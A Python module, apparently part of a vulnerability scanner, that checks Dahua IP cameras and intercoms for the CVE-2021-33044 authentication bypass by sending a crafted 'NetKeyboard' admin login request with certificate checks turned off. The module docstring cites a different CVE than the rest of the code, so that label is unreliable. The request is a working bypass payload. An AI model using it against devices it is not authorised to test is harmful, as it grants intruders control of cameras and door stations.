"""Agent Asteroid implementation for CVE-2024-5315"""

import re
import requests
import logging
import urllib3

from agent.exploits import webexploit
from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "Dahua IPC/VTH/VTO devices auth bypass"
VULNERABILITY_REFERENCE = "CVE-2021-33044"
VULNERABILITY_DESCRIPTION = (
    "The identity authentication bypass vulnerability found in some Dahua products during the login process. "
    "Attackers can bypass device identity authentication by constructing malicious data packets."
)

RISK_RATING = "CRITICAL"

logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def _send_payload(target: definitions.Target) -> bytes | None:
    post_url = f"{target.url}RPC2_Login"
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/94.0.4606.81 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": f"{target}/",
        "Referer": f"{target}/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close",
    }
    post_json = {
        "id": 1,
        "method": "global.login",
        "params": {
            "authorityType": "Default",
            "clientType": "NetKeyboard",
            "loginType": "Direct",
            "password": "Not Used",
            "passwordType": "Default",
            "userName": "admin",
        },
        "session": 0,
    }

    response = requests.post(post_url, headers=headers, json=post_json, verify=False)
    return response.content


@exploits_registry.register
class CVE202133044Exploit(webexploit.WebExploit):
    """
    CVE-2021-33044: Dahua IPC/VTH/VTO devices auth bypass
    """

    accept_request = definitions.Request(method="GET", path="/")
    check_request = definitions.Request(method="POST", path="/RPC2_Login")
    accept_pattern = [re.compile(r"jsBase/lib/jquery\.js\?version=@WebVersion@")]
    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        vulnerabilities: list[definitions.Vulnerability] = []
        response_content = _send_payload(target)
        if response_content is not None and b"true" in response_content:
            logger.info(f"{target} is vulnerable to {VULNERABILITY_REFERENCE}")
            vulnerability = self._create_vulnerability(target)
            vulnerabilities.append(vulnerability)
            return vulnerabilities
        else:
            logger.info(f"{target} is not vulnerable to {VULNERABILITY_REFERENCE}")
            return []
